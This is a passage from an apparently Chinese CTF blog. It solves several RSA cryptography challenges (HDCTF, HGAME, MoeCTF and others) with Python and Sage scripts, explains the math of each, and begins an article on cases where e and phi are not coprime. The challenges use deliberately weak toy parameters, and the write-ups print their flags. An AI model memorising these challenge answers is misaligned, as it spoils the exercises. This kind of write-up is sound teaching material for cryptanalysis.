<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489</span></span><br><span class="line">r = <span class="number">145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span></span><br><span class="line">a = <span class="number">55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span></span><br><span class="line">c = <span class="number">12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p^((r-1)//2) mod r = 1</span></span><br><span class="line"><span class="comment"># a=pow(p,2,r)</span></span><br><span class="line"><span class="comment"># a = p^2 mod r   a r 已知 可以进一步求出p  求出p后 n//p 得到q  然后在求phi d m</span></span><br><span class="line"><span class="comment"># r%4==3</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">135098300162574110032318082604507116145598393187097375349178563291884099917465443655846455456198422625358836544141120445250413758672683505731015242196083913722084539762488109001442453793004455466844129788221721833309756439196036660458760461237225684006072689852654273913614912604470081753828559417535710077291</span></span><br><span class="line">p2 = <span class="number">10393238680760106682068330079504927400023017668703262222099938883730714731279774539115772083330909231443250673803376520592094213873608775241097598890818459890825805707433039425020588461191209551582950712455537148377360546659885111322482174840763781771983328894358193926388929089085190683242441518733058810008</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="comment"># a = p^2 mod r 求p</span></span><br><span class="line"><span class="comment"># r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span></span><br><span class="line"><span class="comment"># a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span></span><br><span class="line"><span class="comment"># R.&lt;x&gt;=PolynomialRing(Zmod(r))</span></span><br><span class="line"><span class="comment"># f=(x^2)-a</span></span><br><span class="line"><span class="comment"># ans=f.roots()</span></span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line"><span class="comment"># p = ans[0][0]</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># [(135098300162574110032318082604507116145598393187097375349178563291884099917465443655846455456198422625358836544141120445250413758672683505731015242196083913722084539762488109001442453793004455466844129788221721833309756439196036660458760461237225684006072689852654273913614912604470081753828559417535710077291, 1), (10393238680760106682068330079504927400023017668703262222099938883730714731279774539115772083330909231443250673803376520592094213873608775241097598890818459890825805707433039425020588461191209551582950712455537148377360546659885111322482174840763781771983328894358193926388929089085190683242441518733058810008, 1)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pow(p,(r-1)//2,r)==1</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(p,(r-<span class="number">1</span>)//<span class="number">2</span>,r)==<span class="number">1</span></span><br><span class="line"><span class="comment"># assert pow(p2,(r-1)//2,r)==1</span></span><br><span class="line"><span class="comment"># sage 求出 p 有两个解 但是题目给出条件  assert pow(p2,(r-1)//2,r)==1  p2不满足 所以只有一个p</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;HDCTF&#123;0ce04f81-516b-4132-81a2-b0b7166e03ad&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HGAME-2022-week3-Multi-Prime-RSA-【欧拉函数】"><a href="#HGAME-2022-week3-Multi-Prime-RSA-【欧拉函数】" class="headerlink" title="[HGAME 2022 week3]Multi Prime RSA 【欧拉函数】"></a>[HGAME 2022 week3]Multi Prime RSA 【欧拉函数】</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">s = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p ** <span class="number">2</span> * q ** <span class="number">3</span> * r ** <span class="number">5</span> * s ** <span class="number">7</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(s2n(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;s = <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>output</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = <span class="number">61789932148719477384027458333380568978056286136137829092952317307711908353477</span></span><br><span class="line">q = <span class="number">91207969353355763685633284378833506319794714507027332929290701748727534193861</span></span><br><span class="line">r = <span class="number">105471299607375388622347272479207944509670502835651250945203397530010861809367</span></span><br><span class="line">s = <span class="number">83153238748903772448138307505579799277162652151244477391465130504267171881437</span></span><br><span class="line">n = <span class="number">1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析</p>
<p>n可以分成多个素数 且 p q r s 都已知  算出phi来 求d 再求m即可</p>
<p>通过欧拉函数 计算phi(n) 带入然后拆分即可</p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># n = p ** 2 * q ** 3 * r ** 5 * s ** 7</span></span><br><span class="line"><span class="comment"># phi(n) = phi(p*p) * phi(q*q*q) * phi(r*r*r*r*r) * phi(s*s*s*s*s*s*s)</span></span><br><span class="line"><span class="comment">#        = p* phi(p) * q^2* phi(q) * r^4*phi(r) * s^6*phi(s)</span></span><br><span class="line"><span class="comment">#        = p*(p-1) * q^2*(q-1) * r^4*(r-1) * s^6*(s-1)</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">61789932148719477384027458333380568978056286136137829092952317307711908353477</span></span><br><span class="line">q = <span class="number">91207969353355763685633284378833506319794714507027332929290701748727534193861</span></span><br><span class="line">r = <span class="number">105471299607375388622347272479207944509670502835651250945203397530010861809367</span></span><br><span class="line">s = <span class="number">83153238748903772448138307505579799277162652151244477391465130504267171881437</span></span><br><span class="line">n = <span class="number">1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</span></span><br><span class="line"></span><br><span class="line">phi_n = p*(p-<span class="number">1</span>) * q**<span class="number">2</span>*(q-<span class="number">1</span>) * r**<span class="number">4</span>*(r-<span class="number">1</span>) * s**<span class="number">6</span>*(s-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;EulEr:fUNcTIon;iS.So*IMpORTaNt*In&amp;RsA&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA中e与phi不互素问题</title>
    <url>/posts/81fc4c38/</url>
    <content><![CDATA[<h1 id="RSA中-e-phi不互素问题"><a href="#RSA中-e-phi不互素问题" class="headerlink" title="RSA中 e phi不互素问题"></a>RSA中 e phi不互素问题</h1><p>  在一般的RSA题目中，通过得到phi后求出e在phi在的逆元进而私钥d， 随后可以进一步得到明文m。但是求逆元需要满足一个前提  gcd(e,phi) == 1 ，需要e与phi互素，如果e和phi不互素则需要其他方法。本文将简单总结下在RSA中e与phi不互素的情况。</p>
<p>【密码学小白，缺少较多的数学基础，所以有些地方看不懂只好先套轮子Orz，后续慢慢补，大佬莫怪】</p>
<h2 id="类型一-e仅与p-1或q-1互素"><a href="#类型一-e仅与p-1或q-1互素" class="headerlink" title="类型一  e仅与p-1或q-1互素"></a>类型一  e仅与p-1或q-1互素</h2><h3 id="2022MoeCTF-Signin"><a href="#2022MoeCTF-Signin" class="headerlink" title="2022MoeCTF Signin"></a>2022MoeCTF Signin</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="comment">#p= 12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073</span></span><br><span class="line"><span class="comment">#q= 12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379</span></span><br><span class="line"><span class="comment">#c= 68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595</span></span><br></pre></td></tr></table></figure>

<p>题目分析</p>
<p>题中phi%e == 0，gcd(e,phi)=65535【也可以使用AMM算法解决此题，具体见下文】</p>
<p>phi与p-1互素 gcd(e,p-1)=1，那么可以将原本的phi 转换成 p-1进行求解。</p>
<p>如果 gcd(e,phi)=1，根据欧拉定理则有  e^d  ≡ 1 mod phi    e^d=1+k<em>phi = 1+k</em>(p-1)(q-1)；m ≡ c^d mod (p*q) </p>
<p>现在 gcd(e,p-1)=1，则有  e^d  ≡ 1 mod (p-1)；m ≡ c^d mod p</p>
<p>那么对应有  m = pow(c,d,n)，也就变成 m = pow(c,d,p) </p>
<h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">p= <span class="number">12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073</span></span><br><span class="line">q= <span class="number">12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379</span></span><br><span class="line">c= <span class="number">68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(gmpy2.gcd(e,phi))</span></span><br><span class="line"><span class="comment"># print(gmpy2.gcd(e,p-1))</span></span><br><span class="line"><span class="comment"># print(gmpy2.gcd(e,q-1))</span></span><br><span class="line"></span><br><span class="line">phi = p-<span class="number">1</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;Oh~Now_Y0u_Kn0W_HoW_RsA_W0rkS!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="2023MoeCTF-bad-E"><a href="#2023MoeCTF-bad-E" class="headerlink" title="2023MoeCTF bad_E"></a>2023MoeCTF bad_E</h3><p>和2022的一样的题  将模从phi转换为 p或q进行求解</p>
<h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p) <span class="comment"># 6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span></span><br><span class="line"><span class="built_in">print</span>(q) <span class="comment"># 11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,p*q)</span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span></span><br><span class="line">q = <span class="number">11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span></span><br><span class="line">c = <span class="number">63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,p-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,q-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#  gcd(e,q-1) = 1</span></span><br><span class="line"></span><br><span class="line">phi = q-<span class="number">1</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;N0w_Y0U_hAve_kN0w_h0w_rsA_w0rks!_f!lP0iYlJf!M3ru&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="黑盾杯-2020-Factor"><a href="#黑盾杯-2020-Factor" class="headerlink" title="[黑盾杯 2020]Factor"></a>[黑盾杯 2020]Factor</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="number">3454083680130687060405946528826790951695785465926614724373</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1347530713288996422676156069761604101177635382955634367208</span></span><br><span class="line">gcd(m, n) = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>yafu分解n可以得到 p q r 3个素数</p>
<p>gcd(e,p-1)=3 较小 可将phi=p<em>q</em>r转换为 phi=q<em>r 进行求解，对应的m=pow(c,d,n)也就转变为pow(c,d,q</em>r)</p>
<h4 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">3454083680130687060405946528826790951695785465926614724373</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1347530713288996422676156069761604101177635382955634367208</span></span><br><span class="line"><span class="comment"># yafu 分解n</span></span><br><span class="line">p = <span class="number">17100682436035561357</span></span><br><span class="line">q = <span class="number">17172929050033177661</span></span><br><span class="line">r = <span class="number">11761833764528579549</span></span><br><span class="line"></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(gmpy2.gcd(e,p-1))</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">phi = (q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,q*r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;CMISCCTF&#123;3_RSA&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="类型二-gcd-e-phi-较小-iroot开根"><a href="#类型二-gcd-e-phi-较小-iroot开根" class="headerlink" title="类型二  gcd(e,phi)较小  iroot开根"></a>类型二  gcd(e,phi)较小  iroot开根</h2><p>gcd2 = gcd(e,phi) 较小    可通过iroot开根 e//gcd2 次根</p>
<h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span>*<span class="number">2</span></span><br><span class="line">n = p*q </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 9927950299160071928293508814174740578824022211226572614475267385787727188317224760986347883270504573953862618573051241506246884352854313099453586586022059</span></span><br><span class="line"><span class="string">q = 9606476151905841036013578452822151891782938033700390347379468858357928877640534612459734825681004415976431665670102068256547092636766287603818164456689343</span></span><br><span class="line"><span class="string">e = 131074</span></span><br><span class="line"><span class="string">c = 68145285629092005589126591120307889109483909395989426479108244531402455690717006058397784318664114589567149811644664654952286387794458474073250495807456996723468838094551501146672038892183058042546944692051403972876692350946611736455784779361761930869993818138259781995078436790236277196516800834433299672560</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>t = gcd(e,phi)=gcd(e,p-1)=gcd(e,p-1)=2 </p>
<p>e‘ = e // t</p>
<p>d = gmpy2.invert(e’,phi)</p>
<p>(m^t)^e’ ≡  c (mod n)</p>
<p>m^t ≡ c^d (mod n)</p>
<p>然后开t次方跟即可求出m</p>
<h4 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">9927950299160071928293508814174740578824022211226572614475267385787727188317224760986347883270504573953862618573051241506246884352854313099453586586022059</span></span><br><span class="line">q = <span class="number">9606476151905841036013578452822151891782938033700390347379468858357928877640534612459734825681004415976431665670102068256547092636766287603818164456689343</span></span><br><span class="line">e = <span class="number">131074</span></span><br><span class="line">c = <span class="number">68145285629092005589126591120307889109483909395989426479108244531402455690717006058397784318664114589567149811644664654952286387794458474073250495807456996723468838094551501146672038892183058042546944692051403972876692350946611736455784779361761930869993818138259781995078436790236277196516800834433299672560</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,p-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">t = gmpy2.gcd(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">d = gmpy2.invert(e//t, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m_gcd = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(m_gcd,t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> m:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m[<span class="number">0</span>]))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;inverse_and_root&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="类型三-gcd-e-phi-较小-iroot开不出根-，有限域内开根"><a href="#类型三-gcd-e-phi-较小-iroot开不出根-，有限域内开根" class="headerlink" title="类型三 gcd(e,phi)较小 iroot开不出根 ，有限域内开根"></a>类型三 gcd(e,phi)较小 iroot开不出根 ，有限域内开根</h2><p>gcd(e,phi)较小 但iroot开根跑不出来 ,可考虑结合CRT求解进行有限域内开根</p>
<h3 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">38</span>)</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">304</span></span><br><span class="line">enc = <span class="built_in">pow</span>(flag,e,p*q)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment">#9794998439882070838464987778400633526071369507639213778760131552998185895297188941828281554258704149333679257014558677504899624597863467726403690826271979</span></span><br><span class="line"><span 